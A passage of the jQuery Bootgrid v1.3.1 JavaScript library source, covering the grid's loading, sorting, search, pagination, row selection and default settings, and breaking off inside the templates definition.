/*! 
 * jQuery Bootgrid v1.3.1 - 09/11/2015
 * Copyright (c) 2014-2015 Rafael Staib (http://www.jquery-bootgrid.com)
 * Licensed under MIT http://www.opensource.org/licenses/MIT
 */
;(function ($, window, undefined)
{
    /*jshint validthis: true */
    "use strict";

    // GRID INTERNAL FIELDS
    // ====================

    var namespace = ".rs.jquery.bootgrid";

    // GRID INTERNAL FUNCTIONS
    // =====================

    function appendRow(row)
    {
        var that = this;

        function exists(item)
        {
            return that.identifier && item[that.identifier] === row[that.identifier];
        }

        if (!this.rows.contains(exists))
        {
            this.rows.push(row);
            return true;
        }

        return false;
    }

    function findFooterAndHeaderItems(selector)
    {
        var footer = (this.footer) ? this.footer.find(selector) : $(),
            header = (this.header) ? this.header.find(selector) : $();
        return $.merge(footer, header);
    }

    function getParams(context)
    {
        return (context) ? $.extend({}, this.cachedParams, { ctx: context }) :
            this.cachedParams;
    }

    function getRequest()
    {
        var request = {
                current: this.current,
                rowCount: this.rowCount,
                sort: this.sortDictionary,
                searchPhrase: this.searchPhrase
            },
            post = this.options.post;

        post = ($.isFunction(post)) ? post() : post;
        return this.options.requestHandler($.extend(true, request, post));
    }

    function getCssSelector(css)
    {
        return "." + $.trim(css).replace(/\s+/gm, ".");
    }

    function getUrl()
    {
        var url = this.options.url;
        return ($.isFunction(url)) ? url() : url;
    }

    function init()
    {
        this.element.trigger("initialize" + namespace);

        loadColumns.call(this); // Loads columns from HTML thead tag
        this.selection = this.options.selection && this.identifier != null;
        loadRows.call(this); // Loads rows from HTML tbody tag if ajax is false
        prepareTable.call(this);
        renderTableHeader.call(this);
        renderSearchField.call(this);
        renderActions.call(this);
        loadData.call(this);

        this.element.trigger("initialized" + namespace);
    }

    function highlightAppendedRows(rows)
    {
        if (this.options.highlightRows)
        {
            // todo: implement
        }
    }

    function isVisible(column)
    {
        return column.visible;
    }

    function loadColumns()
    {
        var that = this,
            firstHeadRow = this.element.find("thead > tr").first(),
            sorted = false;

        /*jshint -W018*/
        firstHeadRow.children().each(function ()
        {
            var $this = $(this),
                data = $this.data(),
                column = {
                    id: data.columnId,
                    identifier: that.identifier == null && data.identifier || false,
                    converter: that.options.converters[data.converter || data.type] || that.options.converters["string"],
                    text: $this.text(),
                    align: data.align || "left",
                    headerAlign: data.headerAlign || "left",
                    cssClass: data.cssClass || "",
                    headerCssClass: data.headerCssClass || "",
                    formatter: that.options.formatters[data.formatter] || null,
                    order: (!sorted && (data.order === "asc" || data.order === "desc")) ? data.order : null,
                    searchable: !(data.searchable === false), // default: true
                    sortable: !(data.sortable === false), // default: true
                    visible: !(data.visible === false), // default: true
                    visibleInSelection: !(data.visibleInSelection === false), // default: true
                    width: ($.isNumeric(data.width)) ? data.width + "px" : 
                        (typeof(data.width) === "string") ? data.width : null
                };
            that.columns.push(column);
            if (column.order != null)
            {
                that.sortDictionary[column.id] = column.order;
            }

            // Prevents multiple identifiers
            if (column.identifier)
            {
                that.identifier = column.id;
                that.converter = column.converter;
            }

            // ensures that only the first order will be applied in case of multi sorting is disabled
            if (!that.options.multiSort && column.order !== null)
            {
                sorted = true;
            }
        });
        /*jshint +W018*/
    }

    /*
    response = {
        current: 1,
        rowCount: 10,
        rows: [{}, {}],
        sort: [{ "columnId": "asc" }],
        total: 101
    }
    */

    function loadData()
    {
        var that = this;

        this.element._bgBusyAria(true).trigger("load" + namespace);
        showLoading.call(this);

        function containsPhrase(row)
        {
            var column,
                searchPattern = new RegExp(that.searchPhrase, (that.options.caseSensitive) ? "g" : "gi");

            for (var i = 0; i < that.columns.length; i++)
            {
                column = that.columns[i];
                if (column.searchable && column.visible &&
                    column.converter.to(row[column.id]).search(searchPattern) > -1)
                {
                    return true;
                }
            }

            return false;
        }

        function update(rows, total)
        {
            that.currentRows = rows;
            setTotals.call(that, total);

            if (!that.options.keepSelection)
            {
                that.selectedRows = [];
            }

            renderRows.call(that, rows);
            renderInfos.call(that);
            renderPagination.call(that);

            that.element._bgBusyAria(false).trigger("loaded" + namespace);
        }

        if (this.options.ajax)
        {
            var request = getRequest.call(this),
                url = getUrl.call(this);

            if (url == null || typeof url !== "string" || url.length === 0)
            {
                throw new Error("Url setting must be a none empty string or a function that returns one.");
            }

            // aborts the previous ajax request if not already finished or failed
            if (this.xqr)
            {
                this.xqr.abort();
            }

            var settings = {
                url: url,
                data: request,
                success: function(response)
                {
                    that.xqr = null;

                    if (typeof (response) === "string")
                    {
                        response = $.parseJSON(response);
                    }

                    response = that.options.responseHandler(response);

                    that.current = response.current;
                    update(response.rows, response.total);
                },
                error: function (jqXHR, textStatus, errorThrown)
                {
                    that.xqr = null;

                    if (textStatus !== "abort")
                    {
                        renderNoResultsRow.call(that); // overrides loading mask
                        that.element._bgBusyAria(false).trigger("loaded" + namespace);
                    }
                }
            };
            settings = $.extend(this.options.ajaxSettings, settings);

            this.xqr = $.ajax(settings);
        }
        else
        {
            var rows = (this.searchPhrase.length > 0) ? this.rows.where(containsPhrase) : this.rows,
                total = rows.length;
            if (this.rowCount !== -1)
            {
                rows = rows.page(this.current, this.rowCount);
            }

            // todo: improve the following comment
            // setTimeout decouples the initialization so that adding event handlers happens before
            window.setTimeout(function () { update(rows, total); }, 10);
        }
    }

    function loadRows()
    {
        if (!this.options.ajax)
        {
            var that = this,
                rows = this.element.find("tbody > tr");

            rows.each(function ()
            {
                var $this = $(this),
                    cells = $this.children("td"),
                    row = {};

                $.each(that.columns, function (i, column)
                {
                    row[column.id] = column.converter.from(cells.eq(i).text());
                });

                appendRow.call(that, row);
            });

            setTotals.call(this, this.rows.length);
            sortRows.call(this);
        }
    }

    function setTotals(total)
    {
        this.total = total;
        this.totalPages = (this.rowCount === -1) ? 1 :
            Math.ceil(this.total / this.rowCount);
    }

    function prepareTable()
    {
        var tpl = this.options.templates,
            wrapper = (this.element.parent().hasClass(this.options.css.responsiveTable)) ?
                this.element.parent() : this.element;

        this.element.addClass(this.options.css.table);

        // checks whether there is an tbody element; otherwise creates one
        if (this.element.children("tbody").length === 0)
        {
            this.element.append(tpl.body);
        }

        if (this.options.navigation & 1)
        {
            this.header = $(tpl.header.resolve(getParams.call(this, { id: this.element._bgId() + "-header" })));
            wrapper.before(this.header);
        }

        if (this.options.navigation & 2)
        {
            this.footer = $(tpl.footer.resolve(getParams.call(this, { id: this.element._bgId() + "-footer" })));
            wrapper.after(this.footer);
        }
    }

    function renderActions()
    {
        if (this.options.navigation !== 0)
        {
            var css = this.options.css,
                selector = getCssSelector(css.actions),
                actionItems = findFooterAndHeaderItems.call(this, selector);

            if (actionItems.length > 0)
            {
                var that = this,
                    tpl = this.options.templates,
                    actions = $(tpl.actions.resolve(getParams.call(this)));

                // Refresh Button
                if (this.options.ajax)
                {
                    var refreshIcon = tpl.icon.resolve(getParams.call(this, { iconCss: css.iconRefresh })),
                        refresh = $(tpl.actionButton.resolve(getParams.call(this,
                        { content: refreshIcon, text: this.options.labels.refresh })))
                            .on("click" + namespace, function (e)
                            {
                                // todo: prevent multiple fast clicks (fast click detection)
                                e.stopPropagation();
                                that.current = 1;
                                loadData.call(that);
                            });
                    actions.append(refresh);
                }

                // Row count selection
                renderRowCountSelection.call(this, actions);

                // Column selection
                renderColumnSelection.call(this, actions);

                replacePlaceHolder.call(this, actionItems, actions);
            }
        }
    }

    function renderColumnSelection(actions)
    {
        if (this.options.columnSelection && this.columns.length > 1)
        {
            var that = this,
                css = this.options.css,
                tpl = this.options.templates,
                icon = tpl.icon.resolve(getParams.call(this, { iconCss: css.iconColumns })),
                dropDown = $(tpl.actionDropDown.resolve(getParams.call(this, { content: icon }))),
                selector = getCssSelector(css.dropDownItem),
                checkboxSelector = getCssSelector(css.dropDownItemCheckbox),
                itemsSelector = getCssSelector(css.dropDownMenuItems);

            $.each(this.columns, function (i, column)
            {
                if (column.visibleInSelection)
                {
                    var item = $(tpl.actionDropDownCheckboxItem.resolve(getParams.call(that,
                        { name: column.id, label: column.text, checked: column.visible })))
                            .on("click" + namespace, selector, function (e)
                            {
                                e.stopPropagation();
        
                                var $this = $(this),
                                    checkbox = $this.find(checkboxSelector);
                                if (!checkbox.prop("disabled"))
                                {
                                    column.visible = checkbox.prop("checked");
                                    var enable = that.columns.where(isVisible).length > 1;
                                    $this.parents(itemsSelector).find(selector + ":has(" + checkboxSelector + ":checked)")
                                        ._bgEnableAria(enable).find(checkboxSelector)._bgEnableField(enable);
        
                                    that.element.find("tbody").empty(); // Fixes an column visualization bug
                                    renderTableHeader.call(that);
                                    loadData.call(that);
                                }
                            });
                    dropDown.find(getCssSelector(css.dropDownMenuItems)).append(item);
                }
            });
            actions.append(dropDown);
        }
    }

    function renderInfos()
    {
        if (this.options.navigation !== 0)
        {
            var selector = getCssSelector(this.options.css.infos),
                infoItems = findFooterAndHeaderItems.call(this, selector);

            if (infoItems.length > 0)
            {
                var end = (this.current * this.rowCount),
                    infos = $(this.options.templates.infos.resolve(getParams.call(this, {
                        end: (this.total === 0 || end === -1 || end > this.total) ? this.total : end,
                        start: (this.total === 0) ? 0 : (end - this.rowCount + 1),
                        total: this.total
                    })));

                replacePlaceHolder.call(this, infoItems, infos);
            }
        }
    }

    function renderNoResultsRow()
    {
        var tbody = this.element.children("tbody").first(),
            tpl = this.options.templates,
            count = this.columns.where(isVisible).length;

        if (this.selection)
        {
            count = count + 1;
        }
        tbody.html(tpl.noResults.resolve(getParams.call(this, { columns: count })));
    }

    function renderPagination()
    {
        if (this.options.navigation !== 0)
        {
            var selector = getCssSelector(this.options.css.pagination),
                paginationItems = findFooterAndHeaderItems.call(this, selector)._bgShowAria(this.rowCount !== -1);

            if (this.rowCount !== -1 && paginationItems.length > 0)
            {
                var tpl = this.options.templates,
                    current = this.current,
                    totalPages = this.totalPages,
                    pagination = $(tpl.pagination.resolve(getParams.call(this))),
                    offsetRight = totalPages - current,
                    offsetLeft = (this.options.padding - current) * -1,
                    startWith = ((offsetRight >= this.options.padding) ?
                        Math.max(offsetLeft, 1) :
                        Math.max((offsetLeft - this.options.padding + offsetRight), 1)),
                    maxCount = this.options.padding * 2 + 1,
                    count = (totalPages >= maxCount) ? maxCount : totalPages;

                renderPaginationItem.call(this, pagination, "first", "&laquo;", "first")
                    ._bgEnableAria(current > 1);
                renderPaginationItem.call(this, pagination, "prev", "&lt;", "prev")
                    ._bgEnableAria(current > 1);

                for (var i = 0; i < count; i++)
                {
                    var pos = i + startWith;
                    renderPaginationItem.call(this, pagination, pos, pos, "page-" + pos)
                        ._bgEnableAria()._bgSelectAria(pos === current);
                }

                if (count === 0)
                {
                    renderPaginationItem.call(this, pagination, 1, 1, "page-" + 1)
                        ._bgEnableAria(false)._bgSelectAria();
                }

                renderPaginationItem.call(this, pagination, "next", "&gt;", "next")
                    ._bgEnableAria(totalPages > current);
                renderPaginationItem.call(this, pagination, "last", "&raquo;", "last")
                    ._bgEnableAria(totalPages > current);

                replacePlaceHolder.call(this, paginationItems, pagination);
            }
        }
    }

    function renderPaginationItem(list, page, text, markerCss)
    {
        var that = this,
            tpl = this.options.templates,
            css = this.options.css,
            values = getParams.call(this, { css: markerCss, text: text, page: page }),
            item = $(tpl.paginationItem.resolve(values))
                .on("click" + namespace, getCssSelector(css.paginationButton), function (e)
                {
                    e.stopPropagation();
                    e.preventDefault();

                    var $this = $(this),
                        parent = $this.parent();
                    if (!parent.hasClass("active") && !parent.hasClass("disabled"))
                    {
                        var commandList = {
                            first: 1,
                            prev: that.current - 1,
                            next: that.current + 1,
                            last: that.totalPages
                        };
                        var command = $this.data("page");
                        that.current = commandList[command] || command;
                        loadData.call(that);
                    }
                    $this.trigger("blur");
                });

        list.append(item);
        return item;
    }

    function renderRowCountSelection(actions)
    {
        var that = this,
            rowCountList = this.options.rowCount;

        function getText(value)
        {
            return (value === -1) ? that.options.labels.all : value;
        }

        if ($.isArray(rowCountList))
        {
            var css = this.options.css,
                tpl = this.options.templates,
                dropDown = $(tpl.actionDropDown.resolve(getParams.call(this, { content: getText(this.rowCount) }))),
                menuSelector = getCssSelector(css.dropDownMenu),
                menuTextSelector = getCssSelector(css.dropDownMenuText),
                menuItemsSelector = getCssSelector(css.dropDownMenuItems),
                menuItemSelector = getCssSelector(css.dropDownItemButton);

            $.each(rowCountList, function (index, value)
            {
                var item = $(tpl.actionDropDownItem.resolve(getParams.call(that,
                    { text: getText(value), action: value })))
                        ._bgSelectAria(value === that.rowCount)
                        .on("click" + namespace, menuItemSelector, function (e)
                        {
                            e.preventDefault();

                            var $this = $(this),
                                newRowCount = $this.data("action");
                            if (newRowCount !== that.rowCount)
                            {
                                // todo: sophisticated solution needed for calculating which page is selected
                                that.current = 1; // that.rowCount === -1 ---> All
                                that.rowCount = newRowCount;
                                $this.parents(menuItemsSelector).children().each(function ()
                                {
                                    var $item = $(this),
                                        currentRowCount = $item.find(menuItemSelector).data("action");
                                    $item._bgSelectAria(currentRowCount === newRowCount);
                                });
                                $this.parents(menuSelector).find(menuTextSelector).text(getText(newRowCount));
                                loadData.call(that);
                            }
                        });
                dropDown.find(menuItemsSelector).append(item);
            });
            actions.append(dropDown);
        }
    }

    function renderRows(rows)
    {
        if (rows.length > 0)
        {
            var that = this,
                css = this.options.css,
                tpl = this.options.templates,
                tbody = this.element.children("tbody").first(),
                allRowsSelected = true,
                html = "";

            $.each(rows, function (index, row)
            {
                var cells = "",
                    rowAttr = " data-row-id=\"" + ((that.identifier == null) ? index : row[that.identifier]) + "\"",
                    rowCss = "";

                if (that.selection)
                {
                    var selected = ($.inArray(row[that.identifier], that.selectedRows) !== -1),
                        selectBox = tpl.select.resolve(getParams.call(that,
                            { type: "checkbox", value: row[that.identifier], checked: selected }));
                    cells += tpl.cell.resolve(getParams.call(that, { content: selectBox, css: css.selectCell }));
                    allRowsSelected = (allRowsSelected && selected);
                    if (selected)
                    {
                        rowCss += css.selected;
                        rowAttr += " aria-selected=\"true\"";
                    }
                }

                var status = row.status != null && that.options.statusMapping[row.status];
                if (status)
                {
                    rowCss += status;
                }

                $.each(that.columns, function (j, column)
                {
                    if (column.visible)
                    {
                        var value = ($.isFunction(column.formatter)) ?
                                column.formatter.call(that, column, row) :
                                    column.converter.to(row[column.id]),
                            cssClass = (column.cssClass.length > 0) ? " " + column.cssClass : "";
                        cells += tpl.cell.resolve(getParams.call(that, {
                            content: (value == null || value === "") ? "&nbsp;" : value,
                            css: ((column.align === "right") ? css.right : (column.align === "center") ?
                                css.center : css.left) + cssClass,
                            style: (column.width == null) ? "" : "width:" + column.width + ";" }));
                    }
                });

                if (rowCss.length > 0)
                {
                    rowAttr += " class=\"" + rowCss + "\"";
                }
                html += tpl.row.resolve(getParams.call(that, { attr: rowAttr, cells: cells }));
            });

            // sets or clears multi selectbox state
            that.element.find("thead " + getCssSelector(that.options.css.selectBox))
                .prop("checked", allRowsSelected);

            tbody.html(html);

            registerRowEvents.call(this, tbody);
        }
        else
        {
            renderNoResultsRow.call(this);
        }
    }

    function registerRowEvents(tbody)
    {
        var that = this,
            selectBoxSelector = getCssSelector(this.options.css.selectBox);

        if (this.selection)
        {
            tbody.off("click" + namespace, selectBoxSelector)
                .on("click" + namespace, selectBoxSelector, function(e)
                {
                    e.stopPropagation();

                    var $this = $(this),
                        id = that.converter.from($this.val());

                    if ($this.prop("checked"))
                    {
                        that.select([id]);
                    }
                    else
                    {
                        that.deselect([id]);
                    }
                });
        }

        tbody.off("click" + namespace, "> tr")
            .on("click" + namespace, "> tr", function(e)
            {
                e.stopPropagation();

                var $this = $(this),
                    id = (that.identifier == null) ? $this.data("row-id") :
                        that.converter.from($this.data("row-id") + ""),
                    row = (that.identifier == null) ? that.currentRows[id] :
                        that.currentRows.first(function (item) { return item[that.identifier] === id; });

                if (that.selection && that.options.rowSelect)
                {
                    if ($this.hasClass(that.options.css.selected))
                    {
                        that.deselect([id]);
                    }
                    else
                    {
                        that.select([id]);
                    }
                }

                that.element.trigger("click" + namespace, [that.columns, row]);
            });
    }

    function renderSearchField()
    {
        if (this.options.navigation !== 0)
        {
            var css = this.options.css,
                selector = getCssSelector(css.search),
                searchItems = findFooterAndHeaderItems.call(this, selector);

            if (searchItems.length > 0)
            {
                var that = this,
                    tpl = this.options.templates,
                    timer = null, // fast keyup detection
                    currentValue = "",
                    searchFieldSelector = getCssSelector(css.searchField),
                    search = $(tpl.search.resolve(getParams.call(this))),
                    searchField = (search.is(searchFieldSelector)) ? search :
                        search.find(searchFieldSelector);

                searchField.on("keyup" + namespace, function (e)
                {
                    e.stopPropagation();
                    var newValue = $(this).val();
                    if (currentValue !== newValue || (e.which === 13 && newValue !== ""))
                    {
                        currentValue = newValue;
                        if (e.which === 13 || newValue.length === 0 || newValue.length >= that.options.searchSettings.characters)
                        {
                            window.clearTimeout(timer);
                            timer = window.setTimeout(function ()
                            {
                                executeSearch.call(that, newValue);
                            }, that.options.searchSettings.delay);
                        }
                    }
                });

                replacePlaceHolder.call(this, searchItems, search);
            }
        }
    }

    function executeSearch(phrase)
    {
        if (this.searchPhrase !== phrase)
        {
            this.current = 1;
            this.searchPhrase = phrase;
            loadData.call(this);
        }
    }

    function renderTableHeader()
    {
        var that = this,
            headerRow = this.element.find("thead > tr"),
            css = this.options.css,
            tpl = this.options.templates,
            html = "",
            sorting = this.options.sorting;

        if (this.selection)
        {
            var selectBox = (this.options.multiSelect) ?
                tpl.select.resolve(getParams.call(that, { type: "checkbox", value: "all" })) : "";
            html += tpl.rawHeaderCell.resolve(getParams.call(that, { content: selectBox,
                css: css.selectCell }));
        }

        $.each(this.columns, function (index, column)
        {
            if (column.visible)
            {
                var sortOrder = that.sortDictionary[column.id],
                    iconCss = ((sorting && sortOrder && sortOrder === "asc") ? css.iconUp :
                        (sorting && sortOrder && sortOrder === "desc") ? css.iconDown : ""),
                    icon = tpl.icon.resolve(getParams.call(that, { iconCss: iconCss })),
                    align = column.headerAlign,
                    cssClass = (column.headerCssClass.length > 0) ? " " + column.headerCssClass : "";
                html += tpl.headerCell.resolve(getParams.call(that, {
                    column: column, icon: icon, sortable: sorting && column.sortable && css.sortable || "",
                    css: ((align === "right") ? css.right : (align === "center") ?
                        css.center : css.left) + cssClass,
                    style: (column.width == null) ? "" : "width:" + column.width + ";" }));
            }
        });

        headerRow.html(html);

        if (sorting)
        {
            var sortingSelector = getCssSelector(css.sortable);
            headerRow.off("click" + namespace, sortingSelector)
                .on("click" + namespace, sortingSelector, function (e)
                {
                    e.preventDefault();

                    setTableHeaderSortDirection.call(that, $(this));
                    sortRows.call(that);
                    loadData.call(that);
                });
        }

        // todo: create a own function for that piece of code
        if (this.selection && this.options.multiSelect)
        {
            var selectBoxSelector = getCssSelector(css.selectBox);
            headerRow.off("click" + namespace, selectBoxSelector)
                .on("click" + namespace, selectBoxSelector, function(e)
                {
                    e.stopPropagation();

                    if ($(this).prop("checked"))
                    {
                        that.select();
                    }
                    else
                    {
                        that.deselect();
                    }
                });
        }
    }

    function setTableHeaderSortDirection(element)
    {
        var css = this.options.css,
            iconSelector = getCssSelector(css.icon),
            columnId = element.data("column-id") || element.parents("th").first().data("column-id"),
            sortOrder = this.sortDictionary[columnId],
            icon = element.find(iconSelector);

        if (!this.options.multiSort)
        {
            element.parents("tr").first().find(iconSelector).removeClass(css.iconDown + " " + css.iconUp);
            this.sortDictionary = {};
        }

        if (sortOrder && sortOrder === "asc")
        {
            this.sortDictionary[columnId] = "desc";
            icon.removeClass(css.iconUp).addClass(css.iconDown);
        }
        else if (sortOrder && sortOrder === "desc")
        {
            if (this.options.multiSort)
            {
                var newSort = {};
                for (var key in this.sortDictionary)
                {
                    if (key !== columnId)
                    {
                        newSort[key] = this.sortDictionary[key];
                    }
                }
                this.sortDictionary = newSort;
                icon.removeClass(css.iconDown);
            }
            else
            {
                this.sortDictionary[columnId] = "asc";
                icon.removeClass(css.iconDown).addClass(css.iconUp);
            }
        }
        else
        {
            this.sortDictionary[columnId] = "asc";
            icon.addClass(css.iconUp);
        }
    }

    function replacePlaceHolder(placeholder, element)
    {
        placeholder.each(function (index, item)
        {
            // todo: check how append is implemented. Perhaps cloning here is superfluous.
            $(item).before(element.clone(true)).remove();
        });
    }

    function showLoading()
    {
        var that = this;

        window.setTimeout(function()
        {
            if (that.element._bgAria("busy") === "true")
            {
                var tpl = that.options.templates,
                    thead = that.element.children("thead").first(),
                    tbody = that.element.children("tbody").first(),
                    firstCell = tbody.find("tr > td").first(),
                    padding = (that.element.height() - thead.height()) - (firstCell.height() + 20),
                    count = that.columns.where(isVisible).length;

                if (that.selection)
                {
                    count = count + 1;
                }
                tbody.html(tpl.loading.resolve(getParams.call(that, { columns: count })));
                if (that.rowCount !== -1 && padding > 0)
                {
                    tbody.find("tr > td").css("padding", "20px 0 " + padding + "px");
                }
            }
        }, 250);
    }

    function sortRows()
    {
        var sortArray = [];

        function sort(x, y, current)
        {
            current = current || 0;
            var next = current + 1,
                item = sortArray[current];

            function sortOrder(value)
            {
                return (item.order === "asc") ? value : value * -1;
            }

            return (x[item.id] > y[item.id]) ? sortOrder(1) :
                (x[item.id] < y[item.id]) ? sortOrder(-1) :
                    (sortArray.length > next) ? sort(x, y, next) : 0;
        }

        if (!this.options.ajax)
        {
            var that = this;

            for (var key in this.sortDictionary)
            {
                if (this.options.multiSort || sortArray.length === 0)
                {
                    sortArray.push({
                        id: key,
                        order: this.sortDictionary[key]
                    });
                }
            }

            if (sortArray.length > 0)
            {
                this.rows.sort(sort);
            }
        }
    }

    // GRID PUBLIC CLASS DEFINITION
    // ====================

    /**
     * Represents the jQuery Bootgrid plugin.
     *
     * @class Grid
     * @constructor
     * @param element {Object} The corresponding DOM element.
     * @param options {Object} The options to override default settings.
     * @chainable
     **/
    var Grid = function(element, options)
    {
        this.element = $(element);
        this.origin = this.element.clone();
        this.options = $.extend(true, {}, Grid.defaults, this.element.data(), options);
        // overrides rowCount explicitly because deep copy ($.extend) leads to strange behaviour
        var rowCount = this.options.rowCount = this.element.data().rowCount || options.rowCount || this.options.rowCount;
        this.columns = [];
        this.current = 1;
        this.currentRows = [];
        this.identifier = null; // The first column ID that is marked as identifier
        this.selection = false;
        this.converter = null; // The converter for the column that is marked as identifier
        this.rowCount = ($.isArray(rowCount)) ? rowCount[0] : rowCount;
        this.rows = [];
        this.searchPhrase = "";
        this.selectedRows = [];
        this.sortDictionary = {};
        this.total = 0;
        this.totalPages = 0;
        this.cachedParams = {
            lbl: this.options.labels,
            css: this.options.css,
            ctx: {}
        };
        this.header = null;
        this.footer = null;
        this.xqr = null;

        // todo: implement cache
    };

    /**
     * An object that represents the default settings.
     *
     * @static
     * @class defaults
     * @for Grid
     * @example
     *   // Global approach
     *   $.bootgrid.defaults.selection = true;
     * @example
     *   // Initialization approach
     *   $("#bootgrid").bootgrid({ selection = true });
     **/
    Grid.defaults = {
        navigation: 3, // it's a flag: 0 = none, 1 = top, 2 = bottom, 3 = both (top and bottom)
        padding: 2, // page padding (pagination)
        columnSelection: true,
        rowCount: [10, 25, 50, -1], // rows per page int or array of int (-1 represents "All")

        /**
         * Enables row selection (to enable multi selection see also `multiSelect`). Default value is `false`.
         *
         * @property selection
         * @type Boolean
         * @default false
         * @for defaults
         * @since 1.0.0
         **/
        selection: false,

        /**
         * Enables multi selection (`selection` must be set to `true` as well). Default value is `false`.
         *
         * @property multiSelect
         * @type Boolean
         * @default false
         * @for defaults
         * @since 1.0.0
         **/
        multiSelect: false,

        /**
         * Enables entire row click selection (`selection` must be set to `true` as well). Default value is `false`.
         *
         * @property rowSelect
         * @type Boolean
         * @default false
         * @for defaults
         * @since 1.1.0
         **/
        rowSelect: false,

        /**
         * Defines whether the row selection is saved internally on filtering, paging and sorting
         * (even if the selected rows are not visible).
         *
         * @property keepSelection
         * @type Boolean
         * @default false
         * @for defaults
         * @since 1.1.0
         **/
        keepSelection: false,

        highlightRows: false, // highlights new rows (find the page of the first new row)
        sorting: true,
        multiSort: false,

        /**
         * General search settings to configure the search field behaviour.
         *
         * @property searchSettings
         * @type Object
         * @for defaults
         * @since 1.2.0
         **/
        searchSettings: {
            /**
             * The time in milliseconds to wait before search gets executed.
             *
             * @property delay
             * @type Number
             * @default 250
             * @for searchSettings
             **/
            delay: 250,
            
            /**
             * The characters to type before the search gets executed.
             *
             * @property characters
             * @type Number
             * @default 1
             * @for searchSettings
             **/
            characters: 1
        },

        /**
         * Defines whether the data shall be loaded via an asynchronous HTTP (Ajax) request.
         *
         * @property ajax
         * @type Boolean
         * @default false
         * @for defaults
         **/
        ajax: false,

        /**
         * Ajax request settings that shall be used for server-side communication.
         * All setting except data, error, success and url can be overridden.
         * For the full list of settings go to http://api.jquery.com/jQuery.ajax/.
         *
         * @property ajaxSettings
         * @type Object
         * @for defaults
         * @since 1.2.0
         **/
        ajaxSettings: {
            /**
             * Specifies the HTTP method which shall be used when sending data to the server.
             * Go to http://api.jquery.com/jQuery.ajax/ for more details.
             * This setting is overriden for backward compatibility.
             *
             * @property method
             * @type String
             * @default "POST"
             * @for ajaxSettings
             **/
            method: "POST"
        },

        /**
         * Enriches the request object with additional properties. Either a `PlainObject` or a `Function`
         * that returns a `PlainObject` can be passed. Default value is `{}`.
         *
         * @property post
         * @type Object|Function
         * @default function (request) { return request; }
         * @for defaults
         * @deprecated Use instead `requestHandler`
         **/
        post: {}, // or use function () { return {}; } (reserved properties are "current", "rowCount", "sort" and "searchPhrase")

        /**
         * Sets the data URL to a data service (e.g. a REST service). Either a `String` or a `Function`
         * that returns a `String` can be passed. Default value is `""`.
         *
         * @property url
         * @type String|Function
         * @default ""
         * @for defaults
         **/
        url: "", // or use function () { return ""; }

        /**
         * Defines whether the search is case sensitive or insensitive.
         *
         * @property caseSensitive
         * @type Boolean
         * @default true
         * @for defaults
         * @since 1.1.0
         **/
        caseSensitive: true,

        // note: The following properties should not be used via data-api attributes

        /**
         * Transforms the JSON request object in what ever is needed on the server-side implementation.
         *
         * @property requestHandler
         * @type Function
         * @default function (request) { return request; }
         * @for defaults
         * @since 1.1.0
         **/
        requestHandler: function (request) { return request; },

        /**
         * Transforms the response object into the expected JSON response object.
         *
         * @property responseHandler
         * @type Function
         * @default function (response) { return response; }
         * @for defaults
         * @since 1.1.0
         **/
        responseHandler: function (response) { return response; },

        /**
         * A list of converters.
         *
         * @property converters
         * @type Object
         * @for defaults
         * @since 1.0.0
         **/
        converters: {
            numeric: {
                from: function (value) { return +value; }, // converts from string to numeric
                to: function (value) { return value + ""; } // converts from numeric to string
            },
            string: {
                // default converter
                from: function (value) { return value; },
                to: function (value) { return value; }
            }
        },

        /**
         * Contains all css classes.
         *
         * @property css
         * @type Object
         * @for defaults
         **/
        css: {
            actions: "actions btn-group", // must be a unique class name or constellation of class names within the header and footer
            center: "text-center",
            columnHeaderAnchor: "column-header-anchor", // must be a unique class name or constellation of class names within the column header cell
            columnHeaderText: "text",
            dropDownItem: "dropdown-item", // must be a unique class name or constellation of class names within the actionDropDown,
            dropDownItemButton: "dropdown-item-button", // must be a unique class name or constellation of class names within the actionDropDown
            dropDownItemCheckbox: "dropdown-item-checkbox", // must be a unique class name or constellation of class names within the actionDropDown
            dropDownMenu: "dropdown btn-group", // must be a unique class name or constellation of class names within the actionDropDown
            dropDownMenuItems: "dropdown-menu pull-right", // must be a unique class name or constellation of class names within the actionDropDown
            dropDownMenuText: "dropdown-text", // must be a unique class name or constellation of class names within the actionDropDown
            footer: "bootgrid-footer container-fluid",
            header: "bootgrid-header container-fluid",
            icon: "icon glyphicon",
            iconColumns: "glyphicon-th-list",
            iconDown: "glyphicon-chevron-down",
            iconRefresh: "glyphicon-refresh",
            iconSearch: "glyphicon-search",
            iconUp: "glyphicon-chevron-up",
            infos: "infos", // must be a unique class name or constellation of class names within the header and footer,
            left: "text-left",
            pagination: "pagination", // must be a unique class name or constellation of class names within the header and footer
            paginationButton: "button", // must be a unique class name or constellation of class names within the pagination

            /**
             * CSS class to select the parent div which activates responsive mode.
             *
             * @property responsiveTable
             * @type String
             * @default "table-responsive"
             * @for css
             * @since 1.1.0
             **/
            responsiveTable: "table-responsive",

            right: "text-right",
            search: "search form-group", // must be a unique class name or constellation of class names within the header and footer
            searchField: "search-field form-control",
            selectBox: "select-box", // must be a unique class name or constellation of class names within the entire table
            selectCell: "select-cell", // must be a unique class name or constellation of class names within the entire table

            /**
             * CSS class to highlight selected rows.
             *
             * @property selected
             * @type String
             * @default "active"
             * @for css
             * @since 1.1.0
             **/
            selected: "active",

            sortable: "sortable",
            table: "bootgrid-table table"
        },

        /**
         * A dictionary of formatters.
         *
         * @property formatters
         * @type Object
         * @for defaults
         * @since 1.0.0
         **/
        formatters: {},

        /**
         * Contains all labels.
         *
         * @property labels
         * @type Object
         * @for defaults
         **/
        labels: {
            all: "All",
            infos: "Showing {{ctx.start}} to {{ctx.end}} of {{ctx.total}} entries",
            loading: "Loading...",
            noResults: "No results found!",
            refresh: "Refresh",
            search: "Search"
        },

        /**
         * Specifies the mapping between status and contextual classes to color rows.
         *
         * @property statusMapping
         * @type Object
         * @for defaults
         * @since 1.2.0
         **/
        statusMapping: {
            /**
             * Specifies a successful or positive action.
             *
             * @property 0
             * @type String
             * @for statusMapping
             **/
            0: "success",

            /**
             * Specifies a neutral informative change or action.
             *
             * @property 1
             * @type String
             * @for statusMapping
             **/
            1: "info",

            /**
             * Specifies a warning that might need attention.
             *
             * @property 2
             * @type String
             * @for statusMapping
             **/
            2: "warning",
            
            /**
             * Specifies a dangerous or potentially negative action.
             *
             * @property 3
             * @type String
             * @for statusMapping
             **/
            3: "danger"
        },

        /**
         * Contains all templates.
         *
         * @property templates
         * @type Object
         * @for defaults
         **/
        templates: {
            actionButton: "<button class=\"btn btn-default\" type=\"button\" title=\"{{ctx.text}}\">{{ctx.content}}</button>",
